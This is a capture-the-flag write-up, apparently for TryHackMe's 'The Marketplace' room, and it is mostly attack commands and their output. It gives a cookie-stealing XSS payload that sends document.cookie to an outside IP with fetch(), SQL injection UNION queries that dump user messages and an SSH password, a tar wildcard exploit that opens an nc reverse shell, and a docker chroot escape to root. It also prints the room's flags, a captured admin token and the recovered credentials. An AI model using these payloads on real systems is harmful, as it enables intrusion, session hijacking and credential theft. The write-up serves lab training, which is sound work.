> The MarketPlace

**export IP=10.10.249.242**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack nginx 1.19.2
32768/tcp open  http    syn-ack Node.js (Express middleware)
```

While visiting the site we find 2 users `michael` and `jake`. After some working we found another user `system`.

# robots.txt

```
User-Agent: *
Disallow: /admin
```

Looks like we can create a new listing and we can upload a file but couldn't get a reverse shell! So let's try XSS. And trying basic xss `<img src=xss onerror=alert(1)>` and `<script> onerror(0)</script>` we have XSS. The admin hecks the system when we report something. So let's steal his cookie.

`<script>fetch("http://10.8.107.21:8000/"+document.cookie)</script>ro`

While we set up a server on our machine and reporting it we have admin's cookie.

`GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDU1MzgyMjJ9.539wAuXFOMIVHHr3r8mibekPPL5SAuCbqwTeuGGXXwg HTTP/1.1`

And entering the cookie there gives us admin access.

## Flag 1

```
THM{c37a63895910e478f28669b048c348d5}
```

When we look at administration panel we look at the url and looks vulnerable!!

# SQLi

To find the no. of columns used let's use order clause here. 

`http://10.10.249.242/admin?user=2 order by 5` gives us error which means we have 4 columns.

And which columns are reflected. `http://10.10.249.242/admin?user=0 union select 1,2,3,4` since there is no such user 0 so 1,2,3,4 is returned by query. And we find 1 and 2.

Finding tables `union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'`. Information schema has the details.

```
User items,messages,users
ID: 1
Is administrator: true 
```

## Investigating user column

`union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'`

```
User id,username,password,isAdministrator
```

`union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'`

```
User id,user_from,user_to,message_content,is_read 
```

## Getting the messages

`union select 1,group_concat(message_content,0x2b,user_to),3,4 from messages`. 0x2b acts as a delimeter.

```
User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ+3,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!+4,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.+4,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!+5,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.+5
```

Looks like we have user 3 password and the user is `user=3` gives us `jake`.

**SSH Credentials => jake:@b_ENXkGYUCAv3zJ**

# user.txt

```
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

# Privilege Escalation

sudo -l

```
(michael) NOPASSWD: /opt/backups/backup.sh
```

## backup.sh

```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

# tar wildcard exploit

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 9001 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 backup.tar shell.sh 
sudo -u michael /opt/backups/backup.sh
```

Now we are in as Michael! We know that we can run docker by running id command.

## Listing docker images

docker image ls

```
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        2 months ago        2.16GB
nginx                        latest              4bb46517cac3        3 months ago        133MB
node                         lts-buster          9c4cc2688584        3 months ago        886MB
mysql                        latest              0d64f46acfd1        3 months ago        544MB
alpine                       latest              a24bb4013296        5 months ago        5.57MB
```

From referring GTFO bins, we come to know that we can get a shell

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Now we are root!!

# root.txt

```
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```